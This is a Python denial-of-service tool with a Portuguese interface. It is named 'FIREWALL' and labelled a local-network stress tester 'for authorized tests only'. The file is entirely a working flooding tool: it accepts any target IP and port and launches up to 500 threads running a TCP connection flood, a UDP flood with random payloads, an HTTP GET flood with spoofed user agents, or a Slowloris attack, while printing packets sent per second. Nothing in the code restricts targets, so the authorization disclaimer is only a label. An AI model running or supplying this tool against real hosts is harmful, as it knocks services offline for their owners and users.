#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# FIREWALL - Ferramenta de Teste de Estresse em Rede Local
# Uso exclusivo para testes autorizados em ambientes controlados

import socket
import threading
import time
import random
import sys
import ipaddress
from datetime import datetime

class FirewallDoS:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.thread_count = 100
        self.attack_running = False
        self.requests_sent = 0
        self.attack_duration = 0
        self.attack_type = "TCP SYN"
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Android 10; Mobile; rv:91.0)"
        ]
        self.banner = """
\033[91m
███████╗██╗██████╗ ███████╗██╗    ██╗ █████╗ ██╗     ██╗     
██╔════╝██║██╔══██╗██╔════╝██║    ██║██╔══██╗██║     ██║     
█████╗  ██║██████╔╝█████╗  ██║ █╗ ██║███████║██║     ██║     
██╔══╝  ██║██╔══██╗██╔══╝  ██║███╗██║██╔══██║██║     ██║     
██║     ██║██║  ██║███████╗╚███╔███╔╝██║  ██║███████╗███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚══════╝
\033[0m
\033[93m╔══════════════════════════════════════════════════════════════╗
║   FERRAMENTA DE TESTE DE ESTRESSE EM REDE LOCAL - v2.0      ║
║        Uso exclusivo para testes autorizados                ║
╚══════════════════════════════════════════════════════════════╝\033[0m
"""

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        self.clear_screen()
        print(self.banner)

    def validate_ip(self, ip):
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    def validate_port(self, port):
        try:
            port = int(port)
            return 1 <= port <= 65535
        except ValueError:
            return False

    def show_menu(self):
        while True:
            self.print_banner()
            print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
            print("║                         MENU PRINCIPAL                         ║")
            print("╠══════════════════════════════════════════════════════════════╣")
            print("║ 1. Configurar Alvo                                            ║")
            print("║ 2. Configurar Método de Ataque                                ║")
            print("║ 3. Configurar Parâmetros                                     ║")
            print("║ 4. Iniciar Ataque                                            ║")
            print("║ 5. Visualizar Configuração                                   ║")
            print("║ 6. Sair                                                      ║")
            print("╚══════════════════════════════════════════════════════════════╝\033[0m")
            
            choice = input("\n\033[92m[FIREWALL]>\033[0m Escolha uma opção: ")
            
            if choice == '1':
                self.configure_target()
            elif choice == '2':
                self.configure_attack_method()
            elif choice == '3':
                self.configure_parameters()
            elif choice == '4':
                self.start_attack()
            elif choice == '5':
                self.show_config()
            elif choice == '6':
                print("\n\033[93m[+] Encerrando o FIREWALL...\033[0m")
                sys.exit(0)
            else:
                print("\n\033[91m[!] Opção inválida. Tente novamente.\033[0m")
                time.sleep(1)

    def configure_target(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║                   CONFIGURAR ALVO                              ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        while True:
            ip = input("\n[+] IP do alvo: ").strip()
            if self.validate_ip(ip):
                self.target_ip = ip
                break
            else:
                print("\033[91m[!] Endereço IP inválido. Tente novamente.\033[0m")
        
        while True:
            port = input("[+] Porta do alvo (1-65535): ").strip()
            if self.validate_port(port):
                self.target_port = int(port)
                break
            else:
                print("\033[91m[!] Porta inválida. Deve ser entre 1 e 65535.\033[0m")
        
        print("\n\033[92m[+] Alvo configurado com sucesso!\033[0m")
        time.sleep(1)

    def configure_attack_method(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║               MÉTODO DE ATAQUE                                  ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print("║ 1. TCP SYN Flood (Padrão)                                     ║")
        print("║ 2. UDP Flood                                                  ║")
        print("║ 3. HTTP GET Flood                                             ║")
        print("║ 4. Slowloris (Conexões parciais)                              ║")
        print("║ 5. Voltar ao menu                                             ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        choice = input("\n\033[92m[FIREWALL]>\033[0m Escolha o método: ")
        
        methods = {
            '1': 'TCP SYN',
            '2': 'UDP',
            '3': 'HTTP GET',
            '4': 'Slowloris'
        }
        
        if choice in methods:
            self.attack_type = methods[choice]
            print(f"\n\033[92m[+] Método configurado: {self.attack_type}\033[0m")
        elif choice != '5':
            print("\033[91m[!] Opção inválida. Mantendo método atual.\033[0m")
        
        time.sleep(1)

    def configure_parameters(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║                   PARÂMETROS DO ATAQUE                         ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        while True:
            try:
                threads = input("\n[+] Número de threads (1-500): ").strip()
                threads = int(threads)
                if 1 <= threads <= 500:
                    self.thread_count = threads
                    break
                else:
                    print("\033[91m[!] Deve ser entre 1 e 500.\033[0m")
            except ValueError:
                print("\033[91m[!] Valor inválido. Digite um número.\033[0m")
        
        print("\n\033[92m[+] Parâmetros configurados com sucesso!\033[0m")
        time.sleep(1)

    def show_config(self):
        self.print_banner()
        print("\n\033[94m╔══════════════════════════════════════════════════════════════╗")
        print("║                   CONFIGURAÇÃO ATUAL                           ║")
        print("╠══════════════════════════════════════════════════════════════╣")
        print(f"║ Alvo: {self.target_ip if self.target_ip else 'Não configurado':<45} ║")
        print(f"║ Porta: {self.target_port if self.target_port else 'Não configurado':<44} ║")
        print(f"║ Método: {self.attack_type:<43} ║")
        print(f"║ Threads: {self.thread_count:<43} ║")
        print("╚══════════════════════════════════════════════════════════════╝\033[0m")
        
        input("\n[Pressione Enter para voltar...")

    def generate_http_payload(self):
        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 10)))
        return (f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"User-Agent: {random.choice(self.user_agents)}\r\n"
                f"Accept: */*\r\n"
                f"Connection: keep-alive\r\n\r\n").encode()

    def tcp_syn_attack(self):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target_ip, self.target_port))
                s.close()
                self.requests_sent += 1
            except:
                pass

    def udp_flood_attack(self):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(1024)
                s.sendto(payload, (self.target_ip, self.target_port))
                self.requests_sent += 1
                s.close()
            except:
                pass

    def http_get_attack(self):
        while self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
                s.send(self.generate_http_payload())
                self.requests_sent += 1
                s.close()
            except:
                pass

    def slowloris_attack(self):
        sockets = []
        try:
            # Estabelece várias conexões e mantém abertas
            for _ in range(100):
                if not self.attack_running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, self.target_port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode())
                    sockets.append(s)
                    self.requests_sent += 1
                except:
                    pass
            
            # Mantém as conexões abertas
            while self.attack_running:
                for s in sockets:
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.requests_sent += 1
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                time.sleep(10)
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

    def start_attack(self):
        if not self.target_ip or not self.target_port:
            print("\n\033[91m[!] Configure o alvo primeiro!\033[0m")
            time.sleep(1)
            return

        self.print_banner()
        print(f"\n\033[91m[+] INICIANDO ATAQUE {self.attack_type} CONTRA {self.target_ip}:{self.target_port}\033[0m")
        print(f"[+] Usando {self.thread_count} threads")
        print("[+] Pressione Ctrl+C para parar o ataque\n")

        self.attack_running = True
        self.requests_sent = 0
        start_time = time.time()

        # Seleciona o método de ataque
        attack_methods = {
            'TCP SYN': self.tcp_syn_attack,
            'UDP': self.udp_flood_attack,
            'HTTP GET': self.http_get_attack,
            'Slowloris': self.slowloris_attack
        }

        # Inicia as threads
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=attack_methods[self.attack_type])
            t.daemon = True
            t.start()
            threads.append(t)

        # Exibe estatísticas durante o ataque
        try:
            while True:
                elapsed = time.time() - start_time
                print(f"\r[+] Pacotes enviados: {self.requests_sent} | Taxa: {int(self.requests_sent/elapsed)}/seg", end='')
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.attack_running = False
            print("\n\n[+] Parando o ataque... Aguarde as threads terminarem")
            
            # Espera as threads terminarem
            for t in threads:
                t.join(timeout=1)
            
            elapsed = time.time() - start_time
            print(f"\n[+] Ataque concluído!")
            print(f"[+] Total de pacotes enviados: {self.requests_sent}")
            print(f"[+] Duração: {elapsed:.2f} segundos")
            print(f"[+] Taxa média: {int(self.requests_sent/elapsed)} pacotes/segundo")
            input("\n[Pressione Enter para voltar...")

if __name__ == "__main__":
    try:
        import os
        tool = FirewallDoS()
        tool.show_menu()
    except KeyboardInterrupt:
        print("\n\033[93m[+] Encerrando o FIREWALL...\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Erro fatal: {str(e)}\033[0m")
        sys.exit(1)
